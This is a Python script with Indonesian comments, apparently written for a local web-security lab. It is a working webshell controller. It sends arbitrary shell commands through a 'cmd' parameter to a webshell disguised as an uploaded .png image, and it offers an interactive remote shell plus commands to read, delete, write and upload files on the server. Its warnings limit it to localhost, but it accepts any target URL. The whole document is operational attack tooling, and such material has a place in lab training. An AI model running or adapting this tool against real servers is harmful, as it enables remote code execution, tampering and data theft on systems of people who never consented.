#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KONTROLER WEBSHELL — tool belajar untuk LAB LOKAL (localhost:8081)
==================================================================
Tool ini mengotomatiskan perintah ke webshell di lab kamu.
Persis seperti yang dilakukan penyerang: mereka TIDAK mengetik
perintah satu-satu di URL browser, tapi memakai script seperti ini.

>>> HANYA UNTUK LAB SENDIRI (localhost) <<<
Jangan pernah jalankan ini ke server orang lain tanpa izin tertulis.
Baca 07_ETIKA_DAN_HUKUM.md sebelum memakai.

Cara kerja:
1. Kirim HTTP GET ke webshell:  /uploads/<file>?cmd=<perintah>
2. Server mengeksekusi perintah (RCE), hasilnya dikirim balik.
3. Tool menampilkan hasilnya + menyimpan log ke session.log

Fitur:
  ping                    -> cek webshell aktif (kirim echo)
  ls                      -> daftar file di folder server
  pwd                     -> folder aktif server saat ini
  mkdir <nama>            -> buat folder di server
  rm <path>               -> hapus file/folder di server
  cat <file>              -> tampilkan isi file server
  write <file> <teks>     -> tulis teks ke file server (dikodekan base64)
  upload <file_lokal>     -> kirim file dari PC-mu ke server (base64)
  help                    -> daftar perintah
  exit                    -> keluar
"""

import argparse
import base64
import sys
import time
import urllib.parse
import urllib.request

# Default: file webshell yang kamu upload di sesi latihan.
DEFAULT_URL = "http://localhost:8081/uploads/20260801_120937_hendro.png"

LOG_FILE = "session.log"


def kirim(url: str, perintah: str) -> str:
    """Kirim satu perintah ke webshell, kembalikan hasilnya."""
    query = urllib.parse.urlencode({"cmd": perintah})
    target = f"{url}?{query}"
    try:
        with urllib.request.urlopen(target, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="replace")
    except Exception as e:
        return f"[KONEKSI GAGAL] {e}"

    # Webshell membungkus hasil dalam <pre>...</pre>. Ambil isinya saja.
    if "<pre>" in body and "</pre>" in body:
        return body.split("<pre>", 1)[1].rsplit("</pre>", 1)[0].strip()
    return body.strip()


def tulis_log(teks: str):
    """Catat semua aktivitas ke session.log (seperti log server)."""
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {teks}\n")


def cek_aktif(url: str) -> bool:
    """Pastikan webshell benar-benar jalan sebelum mulai."""
    hasil = kirim(url, "echo lab-online")
    if "lab-online" in hasil:
        print("[OK] Webshell aktif di:", url)
        return True
    print("[!] Webshell TIDAK merespons. Cek:")
    print("    1. Apakah server lab jalan?  docker ps")
    print("    2. Apakah URL-nya benar?      pakai --url <url>")
    return False


def jalankan(url: str, perintah: str) -> str:
    """Jalankan perintah, catat ke log, tampilkan."""
    tulis_log(f"CMD  : {perintah}")
    hasil = kirim(url, perintah)
    tulis_log(f"OUT  : {hasil}")
    return hasil


def bantu():
    print("""
Perintah server (dijalankan di server lewat webshell):
  ls | pwd | mkdir <nama> | rm <path> | cat <file>

Perintah lokal (diproses tool, bukan dikirim mentah):
  write <file> <teks>   -> tulis teks ke file (base64, aman dari karakter khusus)
  upload <file_lokal>   -> kirim file dari PC ke folder server aktif
  ping                  -> cek webshell aktif
  help                  -> bantuan ini
  exit                  -> keluar
""")


def cmd_write(url: str, nama_file: str, isi: str) -> str:
    """
    Tulis isi teks ke file server.
    Kenapa base64? Karena isi bisa mengandung karakter khusus yang
    membuat shell bingung (<, >, &, spasi, kutip). Base64 mengubahnya
    jadi huruf-angka aman: A-Z a-z 0-9 + / =
    Server lalu men-decode-nya kembali menjadi teks asli.
    """
    kode = base64.b64encode(isi.encode("utf-8")).decode("ascii")
    # echo <kode> | base64 -d > <file>   -> server menulis file hasil decode
    perintah = f"echo {kode} | base64 -d > {nama_file}"
    return jalankan(url, perintah)


def cmd_upload(url: str, file_lokal: str) -> str:
    """Kirim file dari PC ke folder server aktif (base64)."""
    try:
        with open(file_lokal, "rb") as f:
            data = f.read()
    except OSError as e:
        return f"[GAGAL BACA FILE LOKAL] {e}"

    nama_server = file_lokal.replace("\\", "/").split("/")[-1]
    kode = base64.b64encode(data).decode("ascii")
    perintah = f"echo {kode} | base64 -d > {nama_server}"
    print(f"[UPLOAD] {file_lokal} -> server/{nama_server}")
    hasil = jalankan(url, perintah)
    cek = jalankan(url, f"ls -l {nama_server}")
    return hasil + "\n" + cek


def main():
    parser = argparse.ArgumentParser(description="Kontroler webshell (LAB LOKAL)")
    parser.add_argument("--url", default=DEFAULT_URL,
                        help="URL file webshell di lab (default: hasil upload sesi lalu)")
    args = parser.parse_args()

    print("=" * 60)
    print("  KONTROLER WEBSHELL — lab lokal belajar web security")
    print("=" * 60)
    print("  PERINGATAN: hanya untuk localhost/lab sendiri!")
    print("=" * 60)

    if not cek_aktif(args.url):
        sys.exit(1)

    bantu()

    while True:
        try:
            prompt = input("shell> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\nSampai jumpa.")
            break

        if not prompt:
            continue

        if prompt.lower() in ("exit", "quit"):
            print("Sampai jumpa.")
            break

        if prompt.lower() == "help":
            bantu()
            continue

        if prompt.lower() == "ping":
            print(kirim(args.url, "echo lab-online"))
            continue

        # Perintah lokal: write <file> <teks...>
        if prompt.startswith("write "):
            bagian = prompt.split(" ", 2)
            if len(bagian) < 3:
                print("Pakai: write <nama_file> <isi teks>")
                continue
            nama, isi = bagian[1], bagian[2]
            print(cmd_write(args.url, nama, isi))
            continue

        # Perintah lokal: upload <file_lokal>
        if prompt.startswith("upload "):
            file_lokal = prompt.split(" ", 1)[1].strip()
            print(cmd_upload(args.url, file_lokal))
            continue

        # Selain itu: kirim langsung ke server
        print(jalankan(args.url, prompt))


if __name__ == "__main__":
    main()
